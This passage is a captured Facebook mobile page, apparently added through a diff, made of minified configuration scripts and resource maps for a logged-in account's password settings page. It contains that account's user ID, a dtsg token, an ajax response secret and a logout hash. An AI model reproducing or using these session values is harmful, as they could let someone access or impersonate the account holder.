ticky_cookie_expiry_millis":1800000,"partition":-2,"host":"edge-chat","user":100024870700996,"port":null,"path":"\/iframe\/12","resources":[],"active_config_refresh":false,"shutdown_recovery_enabled":true,"uri":"https:\/\/edge-chat.facebook.com\/pull","is_secure_uri":true,"chat_enabled":true,"uid":"100024870700996","viewerUid":"100024870700996","msgr_region":"FRC"},"reconnectURI":"https:\/\/m.facebook.com\/a\/channel\/reconnect"},395],["MMessagesConfig",[],{"msite_genie_xma_rendering":true,"msgrRegion":"FRC"},615]]);new (require("ServerJS"))().handle(\{});}, "ServerJS define", {"root":true})();(require("Bootloader")._pickupPageResources || function()\{})();require("MCoreInit").init({"clearMCache":false,"deferredResources":["WeWRf","VzZ6Y","ZALnP","CvbkU","k6GqT","sojzE","XTYSZ","FEt5G"],"hideLocationBar":true,"onafterload":"window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp(\"t_paint\");;if (window.ExitTime){CavalryLogger.getInstance(\"6562178793502791465-0\").setValue(\"t_exit\", window.ExitTime);};","onload":"CavalryLogger.getInstance(\"6562178793502791465-0\").setTTIEvent(\"t_domcontent\");","serverJSData":{"instances":[["__inst_fe06ddb1_0_0",["MJewelNotifications","__elem_3f4617ca_0_0"],[{"__m":"__elem_3f4617ca_0_0"}],1]],"elements":[["__elem_556710d0_0_0","feed_jewel",1],["__elem_e980dec4_0_0","u_0_8",1],["__elem_e980dec4_0_3","u_0_9",1],["__elem_e980dec4_0_4","u_0_a",1],["__elem_e980dec4_0_5","u_0_b",1],["__elem_e980dec4_0_6","u_0_c",1],["__elem_e980dec4_0_7","u_0_d",1],["__elem_e980dec4_0_8","u_0_e",1],["__elem_3f4617ca_0_0","u_0_f",1],["__elem_556710d0_0_1","search_jewel",1],["__elem_e980dec4_0_1","u_0_g",1],["__elem_1965d86a_0_0","u_0_0",1],["__elem_556710d0_0_2","bookmarks_jewel",1],["__elem_e980dec4_0_2","u_0_h",1],["__elem_1965d86a_0_1","u_0_2",1],["__elem_eed16c0a_0_0","u_0_i",1],["__elem_a588f507_0_0","u_0_j",1],["__elem_a588f507_0_1","u_0_k",1],["__elem_0cdc66ad_0_0","u_0_m",1],["__elem_0cdc66ad_0_1","u_0_n",1]],"require":[["MTouchable"],["MScrollPositionSaver"],["LoadingIndicator","init",["__elem_eed16c0a_0_0","__elem_a588f507_0_0","__elem_a588f507_0_1"],[{"__m":"__elem_eed16c0a_0_0"},{"__m":"__elem_a588f507_0_0"},{"__m":"__elem_a588f507_0_1"}]],["MPageError"],["MJewelSet","initJewels",[],[null,{"showCasualGroups":false,"showMessages":true,"showRequests":true,"shouldRedirectRequestsJewel":false}]],["MInitJewelCounts","main",[],[{"viewer_id":100024870700996}]],["MFeedJewel","init",["__elem_556710d0_0_0"],[{"__m":"__elem_556710d0_0_0"},false]],["MBlockingTouchable","init",["__elem_e980dec4_0_0"],[{"__m":"__elem_e980dec4_0_0"}]],["MGenericJewel","init",["__elem_556710d0_0_1","__elem_1965d86a_0_0"],["search",{"__m":"__elem_556710d0_0_1"},{"__m":"__elem_1965d86a_0_0"}]],["MBlockingTouchable","init",["__elem_e980dec4_0_1"],[{"__m":"__elem_e980dec4_0_1"}]],["MChromeTabsBootloader","bootloadBookmarks",[],["u_0_1"]],["MGenericJewel","init",["__elem_556710d0_0_2","__elem_1965d86a_0_1"],["bookmarks",{"__m":"__elem_556710d0_0_2"},{"__m":"__elem_1965d86a_0_1"}]],["MBlockingTouchable","init",["__elem_e980dec4_0_2"],[{"__m":"__elem_e980dec4_0_2"}]],["MLoadingIndicator","init",[],["u_0_3"]],["MInitJewelCounts","main",[],[{"request_count":0}]],["MBlockingTouchable","init",["__elem_e980dec4_0_3"],[{"__m":"__elem_e980dec4_0_3"}]],["MBlockingTouchable","init",["__elem_e980dec4_0_4"],[{"__m":"__elem_e980dec4_0_4"}]],["MLoadingIndicator","init",[],["u_0_4"]],["MInitJewelCounts","main",[],[{"unseen_thread_ids":[],"unread_thread_ids":[0,1]}]],["MJewelSet","setMessengerCliff",[],[false,null,null]],["MBlockingTouchable","init",["__elem_e980dec4_0_5"],[{"__m":"__elem_e980dec4_0_5"}]],["MModalDialogLink"],["MBlockingTouchable","init",["__elem_e980dec4_0_6"],[{"__m":"__elem_e980dec4_0_6"}]],["MLoadingIndicator","init",[],["u_0_6"]],["MInitJewelCounts","main",[],[{"notification_count":0,"unread_notification_ids":\{}}]],["MBlockingTouchable","init",["__elem_e980dec4_0_7"],[{"__m":"__elem_e980dec4_0_7"}]],["MBlockingTouchable","init",["__elem_e980dec4_0_8"],[{"__m":"__elem_e980dec4_0_8"}]],["__inst_fe06ddb1_0_0"],["MNotificationClick","init",[],[]],["MTimestamp"],["MNotificationClick","init",[],[]],["MNotificationClick","init",[],[]],["MNotificationClick","init",[],[]],["MNotificationClick","init",[],[]],["MPageHeaderAccessibility"],["MBlockingTouchable","init",["__elem_0cdc66ad_0_0"],[{"__m":"__elem_0cdc66ad_0_0"}]],["MBlockingTouchable","init",["__elem_0cdc66ad_0_1"],[{"__m":"__elem_0cdc66ad_0_1"}]],["MLoadingIndicator","init",[],["u_0_l"]],["MPrelude"],["CavalryLoggerImpl","startInstrumentation",[],[]],["Artillery","disable",[],[]],["ArtilleryOnUntilOffLogging","disable",[],[]],["ArtilleryRequestDataCollection","disable",[],["6562178793502791465-0"]],["LogHistoryListeners"],["Artillery"],["ScriptPath","set",[],["XSecuritySettingsPasswordController","a1f3c513",{"imp_id":"df3507a6"}]],["MLogging","main",[],[{"refid":0}]],["RemoteDevice","init",[],[]],["MLink","setupListener",[],[]],["MModalDialogInit"],["MVerifyCache","main",[],[{"viewer":100024870700996}]],["EventProfiler"],["ScriptPathLogger","startLogging",[],[]],["MTimeSpentBitArrayLogger","init",[],["m"]],["NavigationMetrics"],["PerfXLogger"],["ServiceWorkerURLCleaner","removeRedirectID",[],[]]]},"isWildeWeb":false,"isFacewebAndroid":false,"ixData":\{},"gkxData":{"AT7IsskI4XB9V3_ZpKFnRxAvs6BVPIgSDbDcq24b8ToUAOY2pCaSzuagN7f_cNx9vGp7vgNftn1_SRfogFUNGS0K":{"result":false,"hash":"AT6Tnp9Q8553sfoJ"},"AT6pL_xvmKcglNeVwU3ceBbLXrQSVtHi-U3b6_RC1aULyn__B9oBtR-gXP2MrLURZ1Vk9LGqeJudSxVqn_Ov4DNbwo3DZY70m9Cjr7lwqmOdag":{"result":false,"hash":"AT4xB4fAuAoVGlGg"},"AT5tMpZqIKh0vdvJexCKKhPqDfMAWQPHLQnR8CgtajZUMLAZP8rj8YnSD9bEFc4BrmsaxTBmOCxn2mR6tM_ew1hH":{"result":false,"hash":"AT5TJqWBllrAh6_o"},"AT64OjP4oVuvstFjzbDT-bVZiPbiojG0zyjbyWGW5xqhWd5PV8lOQAaU0boVR7zf5v2SUGNGfZkpE7I19ksV-nLimTCJ0AgU9faj1FK9VMmZbw":{"result":false,"hash":"AT6lR5paSEZaGyu_"},"AT6Afdq0Tt2jEesGOMGnSRKoZIl2eQfQBS7ISXiYFG3RHN4ykkPiZeyWuKALtD0ObEVGeeZuAFKdYpfxlBzUUPkd":{"result":false,"hash":"AT6llTCfRoHdkjHM"},"AT5uAQUkspJ5sV5Xpm3CYnJcVxdesf7hwzzLkJI-B3kAxPwbOQNyuBEaqOSMhhQFZNVatxaZNLeFd019lGnmAMYdCEX_PT8Q5ARV7No9dGPIyA":{"result":false,"hash":"AT4lwX0rsQ2u9kvg"},"AT68bJwSI-83elN-7JSMMH9zt32KbiF6pW-XMlf6NViAJ3CbAk_16Vq8cK1tl1029_ApvFwINR8hmoci3nMKFTDhDCBp1wrvYQbOKq0pCjZpqA":{"result":false,"hash":"AT6AwUm2hjpVRGBl"},"AT676eqa9o_v7kGGM53Nfaq6v7ZzAZW1E6NXkuIXW-8sM0N4DkZ16pxYoDT5UIQfy6xorIGXMlqtYgTSAc6F7oiK":{"result":true,"hash":"AT5kEJ-RGIsKP-e_"},"AT5J2eFdLcTezMMRuE1M2NArKONL3RlguQ3m5VpzRWaCJmORt3i3mxTzCtS25Y1Rb4viPrwXLvzxr8xWpv6prWj_":{"result":false,"hash":"AT7l2dTbNIC9QVlK"},"AT4kYIk7PhRqUACJJM8qs58t-WNCoM2ZYe35b1xv03xf3OtmC7RfXVIT9hWB6yTOgfA":{"result":false,"hash":"AT7Hum7RCWTYigDi"},"AT5MAotH6BG7mXo4DyZnW3seA7_jf32c8tGX1llmkbXJ5ui_oKs0jpz-iYum9Gkv1o7pv5ZMvW9WlaNx_vA1ZSmAhi0Rjb62jJA5vu2Oz81AxQ":{"result":true,"hash":"AT7UaP7FxAbtyUzV"},"AT5lEpwHgZeeA6xHEoHzE1AvY3jpO_Bc6RdrX5jknhQ360OKNMpoT8rO0Ay9ORCrNL381BV1XxuYzui6rLp4ERTXwcfzJQXSMo3CFefnMLMHcQ":{"result":true,"hash":"AT7vVi7L1gdJm_p2"}},"bootloadable":{"Banzai":{"resources":[],"module":1},"BanzaiODS":{"resources":["++0ur"],"module":1},"BanzaiStream":{"resources":["++0ur","ZU1ro"],"module":1},"ResourceTimingBootloaderHelper":{"resources":["k6GqT","++0ur"],"module":1},"SnappyCompressUtil":{"resources":[],"module":1},"TimeSliceHelper":{"resources":["GefKK"],"module":1},"ErrorSignal":{"resources":["++0ur","+SmSb"],"module":1},"GeneratedPackerUtils":{"resources":["uYbVb","qlimw"],"module":1},"GeneratedArtilleryUserTimingSink":{"resources":["uYbVb","9Zaf3","sGe+Z","Hx+az"],"module":1},"BanzaiLogger":{"resources":["++0ur"],"module":1},"MTouchChannelPayloadRouter":{"resources":["++0ur","JYQ8x","gDDLZ","np2Vi","efR7z","IH4QJ","yJ6d3","MLTfT","VzZ6Y","Sp+nG","svuq9","B7hmj","9C8RI","mSWnS","Qhw4y","eHOl9","ARjk7","xtN3J","xtgii","mmyXd"],"module":1},"PerfXSharedFields":{"resources":["k6GqT"],"module":1},"TimeSliceInteractionsLiteTypedLogger":{"resources":["++0ur","FHtgt"],"module":1},"WebSpeedInteractionsTypedLogger":{"resources":["++0ur","4LL\/S"],"module":1},"EncryptedImg":{"resources":["Tzoz2","af3wG"],"module":1},"MJewelNotificationList.react":{"resources":["Tzoz2","++0ur","m\/fA1","VzZ6Y","af3wG","WeWRf","23JWQ","ijiqm"],"module":1},"Popover":{"resources":["k6GqT","VzZ6Y","mmyXd"],"module":1},"React":{"resources":["++0ur","Tzoz2"],"module":1},"ReactDOM":{"resources":["++0ur","Tzoz2"],"module":1}},"resource_map":{"ZU1ro":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yq\/r\/708Ezmm99ay.js","crossOrigin":1},"k6GqT":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/r\/yhS6HuKshtR.js","crossOrigin":1},"GefKK":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y-\/r\/-wxYszzzBzi.js","crossOrigin":1},"+SmSb":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yf\/r\/yZzYxWpVUdT.js","crossOrigin":1},"uYbVb":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yh\/r\/Vs01pkrhf9S.js","crossOrigin":1},"qlimw":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yB\/r\/eqxVpJLd0Cd.js","crossOrigin":1},"9Zaf3":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yv\/r\/5ka10Uff-_R.js","crossOrigin":1},"sGe+Z":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yG\/r\/R08WNzACohm.js","crossOrigin":1},"Hx+az":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yz\/r\/bza1TvaqddI.js","crossOrigin":1},"JYQ8x":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i8Hg4\/yf\/l\/en_US\/tQVeEEi13ux.js","crossOrigin":1},"gDDLZ":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ym\/r\/lYSnLMcX2MI.js","crossOrigin":1},"np2Vi":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iRnD4\/yg\/l\/en_US\/EhnYcfh9EYl.js","crossOrigin":1},"efR7z":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yo\/r\/_GHus0kUq_F.js","crossOrigin":1},"IH4QJ":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yh\/r\/pUMbKcLtmBK.js","crossOrigin":1},"yJ6d3":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yN\/r\/ykgFWSS7VT9.js","crossOrigin":1},"MLTfT":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yy\/r\/ZPXsunEMNmg.js","crossOrigin":1},"Sp+nG":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/r\/zDz0WYXX1HW.js","crossOrigin":1},"svuq9":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3il6B4\/ym\/l\/en_US\/DmZHK9Ps4bt.js","crossOrigin":1},"B7hmj":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3isig4\/yO\/l\/en_US\/8mK0413WLqa.js","crossOrigin":1},"9C8RI":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ym\/r\/HjutyHS1EKT.js","crossOrigin":1},"mSWnS":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ircL4\/yZ\/l\/en_US\/083VxpHzQEA.js","crossOrigin":1},"Qhw4y":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iKyN4\/yN\/l\/en_US\/_rhVCroeoCC.js","crossOrigin":1},"eHOl9":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iYjf4\/ys\/l\/en_US\/tcnLfU6iLcV.js","crossOrigin":1},"ARjk7":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ye\/r\/NgV8CLmUNka.js","crossOrigin":1},"xtN3J":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yz\/r\/v5wxOj9_d3D.js","crossOrigin":1},"xtgii":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yk\/r\/PqhgRQbs8r9.js","crossOrigin":1},"sojzE":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iWpk4\/yO\/l\/en_US\/tzdNqgxLvN_.js","crossOrigin":1},"XTYSZ":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iHl44\/y7\/l\/en_US\/4VxV4-vtWjo.js","crossOrigin":1},"FHtgt":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yd\/r\/rlVu09x5_nO.js","crossOrigin":1},"4LL\/S":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yN\/r\/vzWkAp7tVLk.js","crossOrigin":1},"Tzoz2":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yS\/r\/oZinZfOJxmW.js","crossOrigin":1},"af3wG":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iXQm4\/yi\/l\/en_US\/_5h_TdI0VYO.js","crossOrigin":1},"m\/fA1":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yW\/r\/chdcZWuCVEU.js","crossOrigin":1},"23JWQ":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yy\/r\/OID4Re3amn3.js","crossOrigin":1},"ijiqm":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yr\/r\/U2ZWMnzEFU4.js","crossOrigin":1},"FEt5G":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yo\/r\/2p2n-4YaSvj.js","crossOrigin":1}}});
+  </script>
+  <script id="u_0_w">
+   require("MRenderingScheduler").getInstance().init("6562178793502791465-0", {"ttiPagelets":[]});require("TimeSlice").guard(function() {(require("ServerJSDefine")).handleDefines([["ErrorDebugHooks",[],{"SnapShotHook":null},185],["BootloaderConfig",[],{"jsRetries":null,"jsRetryAbortNum":2,"jsRetryAbortTime":5,"payloadEndpointURI":"https:\/\/touch.facebook.com\/ajax\/haste-response\/","assumeNotNonblocking":false,"assumePermanent":true,"skipEndpoint":true},329],["CSSLoaderConfig",[],{"timeout":5000,"modulePrefix":"BLCSS:","loadEventSupported":true},619],["ServerNonce",[],{"ServerNonce":"CagbtVf4Hbl_B727qzc14J"},141],["CurrentCommunityInitialData",[],\{},490],["CurrentUserInitialData",[],{"USER_ID":"100024870700996","ACCOUNT_ID":"100024870700996","NAME":"Brutix Fsec","SHORT_NAME":"Brutix","IS_MESSENGER_ONLY_USER":false,"IS_DEACTIVATED_ALLOWED_ON_MESSENGER":false},270],["MRequestConfig",[],{"dtsg":{"token":"AQFSV7NZfTAI:AQGblYoEMJbh","valid_for":86400,"expire":1527962712},"checkResponseOrigin":true,"checkResponseToken":true,"ajaxResponseToken":{"secret":"HQEbK1BJmtQ2ac9uG5mdM_hRunxW37G_","encrypted":"AYkS3fOUqZGer4hLzr1NMELS2MbYPl205bKnu3AEGqr64j0LXW_jbtfnK57bzI8pUY9FNH96Ign7cUHLp9x-4SxpOi_Q1Jesqb8edpMUxO4yEA"}},51],["PromiseUsePolyfillSetImmediateGK",[],{"www_always_use_polyfill_setimmediate":false},2190],["ISB",[],\{},330],["LSD",[],\{},323],["SiteData",[],{"server_revision":3963560,"client_revision":3963560,"tier":"","push_phase":"C3","pkg_cohort":"FW_EXP:mtouch_pkg","pkg_cohort_key":"__pc","haste_site":"mobile","be_mode":-1,"be_key":"__be","is_rtl":false,"vip":"157.240.9.18"},317],["SprinkleConfig",[],{"param_name":"jazoest"},2111],["KSConfig",[],{"killed":{"__set":["POCKET_MONSTERS_CREATE","POCKET_MONSTERS_DELETE","VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG","PREVENT_INFINITE_URL_REDIRECT","POCKET_MONSTERS_UPDATE_NAME"]}},2580],["UserAgentData",[],{"browserArchitecture":"32","browserFullVersion":"62.0.3202.89","browserMinorVersion":0,"browserName":"Chrome","browserVersion":62,"deviceName":"Unknown","engineName":"WebKit","engineVersion":"537.36","platformArchitecture":"32","platformName":"Linux","platformVersion":null,"platformFullVersion":null},527],["MRenderingSchedulerConfig",[],{"delayNormalResources":true,"isDisplayJSEnabled":false},1978],["MJSEnvironment",[],{"IS_APPLE_WEBKIT_IOS":false,"IS_TABLET":false,"IS_ANDROID":false,"IS_CHROME":true,"IS_FIREFOX":false,"IS_WINDOWS_PHONE":false,"IS_SAMSUNG_DEVICE":false,"OS_VERSION":0,"PIXEL_RATIO":1,"BROWSER_NAME":"Chrome Desktop"},46],["ZeroRewriteRules",[],{"rewrite_rules":\{},"whitelist":{"\/hr\/r":1,"\/hr\/p":1,"\/zero\/unsupported_browser\/":1,"\/zero\/policy\/optin":1,"\/zero\/optin\/write\/":1,"\/zero\/optin\/legal\/":1,"\/zero\/optin\/free\/":1,"\/about\/privacy\/":1,"\/about\/privacy\/update\/":1,"\/about\/privacy\/update":1,"\/zero\/toggle\/welcome\/":1,"\/work\/landing":1,"\/work\/login\/":1,"\/work\/email\/":1,"\/ai.php":1,"\/js_dialog_resources\/dialog_descriptions_android.json":0,"\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/":0,"\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/":0,"\/connect\/jsdialog\/MPlatformLikeJSDialog\/":0,"\/qp\/interstitial\/":1,"\/qp\/action\/redirect\/":1,"\/qp\/action\/close\/":1,"\/zero\/support\/ineligible\/":1,"\/zero_balance_redirect\/":1,"\/zero_balance_redirect":1,"\/l.php":1,"\/lsr.php":1,"\/ajax\/dtsg\/":1,"\/checkpoint\/block\/":1,"\/exitdsite":1,"\/zero\/balance\/pixel\/":1,"\/zero\/balance\/":1,"\/zero\/balance\/carrier_landing\/":1,"\/tr":1,"\/tr\/":1,"\/sem_campaigns\/sem_pixel_test\/":1,"\/bookmarks\/flyout\/body\/":1,"\/zero\/subno\/":1,"\/confirmemail.php":1,"\/policies\/":1,"\/mobile\/internetdotorg\/classifier":1,"\/4oh4.php":1,"\/autologin.php":1,"\/birthday_help.php":1,"\/checkpoint\/":1,"\/contact-importer\/":1,"\/cr.php":1,"\/legal\/terms\/":1,"\/login.php":1,"\/login\/":1,"\/mobile\/account\/":1,"\/n\/":1,"\/remote_test_device\/":1,"\/upsell\/buy\/":1,"\/upsell\/buyconfirm\/":1,"\/upsell\/buyresult\/":1,"\/upsell\/promos\/":1,"\/upsell\/continue\/":1,"\/upsell\/h\/promos\/":1,"\/upsell\/loan\/learnmore\/":1,"\/upsell\/purchase\/":1,"\/upsell\/promos\/upgrade\/":1,"\/upsell\/buy_redirect\/":1,"\/upsell\/loan\/buyconfirm\/":1,"\/upsell\/loan\/buy\/":1,"\/upsell\/sms\/":1,"\/wap\/a\/channel\/reconnect.php":1,"\/wap\/a\/nux\/wizard\/nav.php":1,"\/wap\/appreg.php":1,"\/wap\/birthday_help.php":1,"\/wap\/c.php":1,"\/wap\/confirmemail.php":1,"\/wap\/cr.php":1,"\/wap\/login.php":1,"\/wap\/r.php":1,"\/zero\/datapolicy":1,"\/a\/timezone.php":1,"\/a\/bz":1,"\/bz\/reliability":1,"\/r.php":1,"\/mr\/":1,"\/reg\/":1,"\/registration\/log\/":1,"\/terms\/":1,"\/f123\/":1,"\/expert\/":1,"\/experts\/":1,"\/terms\/index.php":1,"\/terms.php":1,"\/srr\/":1,"\/msite\/redirect\/":1,"\/fbs\/pixel\/":1,"\/contactpoint\/preconfirmation\/":1,"\/contactpoint\/cliff\/":1,"\/contactpoint\/confirm\/submit\/":1,"\/contactpoint\/confirmed\/":1,"\/contactpoint\/login\/":1,"\/preconfirmation\/contactpoint_change\/":1,"\/help\/contact\/":1,"\/survey\/":1,"\/upsell\/loyaltytopup\/accept\/":1,"\/settings\/":1}},1478],["ZeroCategoryHeader",[],\{},1127],["ErrorSignalConfig",[],{"uri":"https:\/\/error.facebook.com\/common\/scribe_endpoint.php"},319],["MBanzaiConfig",[],{"EXPIRY":86400000,"MAX_SIZE":10000,"MAX_WAIT":30000,"RESTORE_WAIT":30000,"gks":{"boosted_component":true,"mchannel_jumpstart":true,"platform_oauth_client_events":true,"visibility_tracking":true,"boosted_pagelikes":true,"gqls_web_logging":true},"blacklist":["time_spent"]},32],["MSession",[],{"useAngora":false,"logoutURL":"\/logout.php?h=AfdUd4vZpexkdP59&t=1527876312","push_phase":"C3"},52],["ArtilleryComponentSaverOptions",[],{"options":{"ads_wait_time_saver":{"shouldCompress":false,"shouldUploadSeparately":false},"ads_flux_profiler_saver":{"shouldCompress":true,"shouldUploadSeparately":false},"timeslice_execution_saver":{"shouldCompress":true,"shouldUploadSeparately":false},"interaction_async_request_join_data":{"shouldCompress":true,"shouldUploadSeparately":true},"resources_saver":{"shouldCompress":true,"shouldUploadSeparately":false},"user_timing_saver":{"shouldCompress":false,"shouldUploadSeparately":false}}},3016],["TimeSliceInteractionSV",[],{"on_demand_reference_counting":true,"on_demand_profiling_counters":true,"default_rate":1000,"lite_default_rate":100,"interaction_to_lite_coinflip":{"ADS_INTERFACES_INTERACTION":0,"ads_perf_scenario":0,"ads_wait_time":0,"Event":10,"video_psr":0,"video_stall":0},"interaction_to_coinflip":{"ADS_INTERFACES_INTERACTION":1,"ads_perf_scenario":1,"ads_wait_time":1,"video_psr":1000000,"video_stall":2500000,"Event":500,"watch_carousel_left_scroll":1,"watch_carousel_right_scroll":1,"watch_sections_load_more":1,"watch_discover_scroll":1,"fbpkg_ui":1,"backbone_ui":1},"enable_heartbeat":true,"maxBlockMergeDuration":0,"maxBlockMergeDistance":0,"enable_banzai_stream":true,"user_timing_coinflip":50,"banzai_stream_coinflip":1,"compression_enabled":true,"ref_counting_fix":true,"ref_counting_cont_fix":false,"also_record_new_timeslice_format":false,"force_async_request_tracing_on":false},2609],["CookieCoreConfig",[],{"a11y":\{},"act":\{},"c_user":\{},"ddid":{"p":"\/deferreddeeplink\/","t":2419200},"dpr":{"t":604800},"js_ver":{"t":604800},"locale":{"t":604800},"lh":{"t":604800},"m_pixel_ratio":{"t":604800},"noscript":\{},"pnl_data2":{"t":2},"presence":\{},"rdir":\{},"sW":\{},"sfau":\{},"wd":{"t":604800},"x-referer":\{},"x-src":{"t":1}},2104],["CookieCoreLoggingConfig",[],{"maximumIgnorableStallMs":16.67,"sampleRate":9.7e-5},3401],["SessionNameConfig",[],{"seed":"0wWe"},757],["BigPipeExperiments",[],{"link_images_to_pagelets":false},907],["MWebStorageMonsterWhiteList",[],{"whitelist":["^Banzai$","^bz","^mutex","^msys","^sp_pi$","^\\:userchooser\\:osessusers$","^\\:userchooser\\:settings$","^[0-9]+:powereditor:","^Bandicoot\\:","^brands\\:console\\:config$","^CacheStorageVersion$","^consoleEnabled$","^_video_$","^vc_","^_showMDevConsole$","^_ctv_$","^ga_client_id$","^qe_switcher_nub_selection$","^_mswam_$"]},254],["AsyncProfilerWorkerResource",[],{"url":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yq\/r\/L2E1WjzsO7-.js","name":"AsyncProfilerWorkerBundle"},2779],["WebWorkerConfig",[],{"logging":{"enabled":false,"config":"WebWorkerLoggerConfig"},"evalWorkerURL":"\/rsrc.php\/v3\/yK\/r\/pcnyCVb0ZCt.js"},297],["FWLoader",[],\{},278],["MLoadingIndicatorSigils",[],{"ANIMATE":"m-loading-indicator-animate","ROOT":"m-loading-indicator-root"},279],["MPageControllerGating",[],{"shouldDeferUntilCertainNoRedirect":false},2023],["FbtLogger",[],{"logger":null},288],["IntlNumberTypeConfig",[],{"impl":"if (n === 1) { return IntlVariations.NUMBER_ONE; } else { return IntlVariations.NUMBER_OTHER; }"},3405],["FbtQTOverrides",[],{"overrides":{"1_43839c1f069957436e65d660aa31e1a0":"Pay no fees on movie tickets"}},551],["FbtResultGK",[],{"shouldReturnFbtResult":true,"inlineMode":"NO_INLINE"},876],["IntlHoldoutGK",[],{"inIntlHoldout":false},2827],["IntlViewerContext",[],{"GENDER":1},772],["NumberFormatConfig",[],{"decimalSeparator":".","numberDelimiter":",","minDigitsForThousandsSeparator":4,"standardDecimalPatternInfo":{"primaryGroupSize":3,"secondaryGroupSize":3},"numberingSystemData":null},54],["IntlPhonologicalRules",[],{"meta":{"\/_B\/":"([.,!?\\s]|^)","\/_E\/":"([.,!?\\s]|$)"},"patterns":{"\/\u0001(.*)('|&#039;)s\u0001(?:'|&#039;)s(.*)\/":"\u0001$1$2s\u0001$3","\/_\u0001([^\u0001]*)\u0001\/":"javascript"}},1496]]);new (require("ServerJS"))().handle({"require":[["MRenderingScheduler","satisfyDependency",[],["tti_ready"]],["MCoreInit","satisfyDependency",[],["tti_ready"]]]});}, "ServerJS define", {"root":true})();
+  </script>
+  <script id="u_0_y">
+   require("MRenderingScheduler").preArrive({"name":"m:chrome:schedulable-graph-search","serverlid":"6562178793502791465-0"})
+  </script>
+  <script id="u_0_z">
+   require("MRenderingScheduler").getInstance().schedule({"id":"m:chrome:schedulable-graph-search","pageletConfig":{"lid":"6562178793502791465-60001","serverlid":"6562178793502791465-0","name":"m:chrome:schedulable-graph-search","pass":6,"serverJSData":{"elements":[["__elem_ad2bcfb1_0_0","u_0_x",1]],"require":[["MSearchTypeaheadNeue","init",["MSideNavMarauderLogger","__elem_ad2bcfb1_0_0","MSearchSimplificationNullstateResult","MSearchSimplificationSeeMoreRecentResultsButton","MSearchSimplificationTypedResult","MSearchSimplificationHeader","MSearchTabsAboveBEM","MSearchBootstrapEntityModule"],[{"typeaheadConfig":{"sources":{"bootstrapped":{"source_key":"facebar3","src":"\/typeahead\/search\/facebar\/bootstrap\/?filters\u00255B0\u00255D=keyword","max_results":6},"nullstate":{"src":"\/typeahead\/search\/facebar\/nullstate\/","max_results":20},"online":{"src":"\/typeahead\/search\/facebar\/query\/?context=facebar&grammar_version=bee09f93fa732cfa59a1cb6d9f450d3892424e49&viewer=100024870700996&rsp=search","max_results":20,"enable_caching":true}},"mSideNavMarauderLogger":{"__m":"MSideNavMarauderLogger"},"typeaheadScubaInfo":null,"disableLongerQueryCacheHit":true,"compositeSourceConfig":{"maxResults":50,"minCostForUserToSurfaceAtTop":7,"maxPositionOfEntityToDivideKeywords":5,"maxKeywordAboveEntities":2,"filterOutTypes":[],"keepBootstrapped":true,"enableLegacyStyleBucketization":true},"hasRecentSearches":false,"hasRecentSearchesSeeMoreButton":false,"hasTopNavSearch":true,"hasKeywordsFirst":false,"hasFlickerFix":false,"numResultsToFetch":13,"initialNumRecentResultsToShow":5,"defaultNumTopResultsToShow":3,"useBlueLocalIcon":true,"isCompactSearch":false,"keywordsOnlyEnabled":true,"keywordBucketSize":6},"currentProfileID":null,"prefilledValue":"","activityLogURI":"\/100024870700996\/allactivity?log_filter=search","vertical":"content","groupName":"","active":false,"userid":100024870700996,"root":{"__m":"__elem_ad2bcfb1_0_0"},"renderers":{"NullstateResult":{"__m":"MSearchSimplificationNullstateResult"},"SeeMoreRecentResultsButton":{"__m":"MSearchSimplificationSeeMoreRecent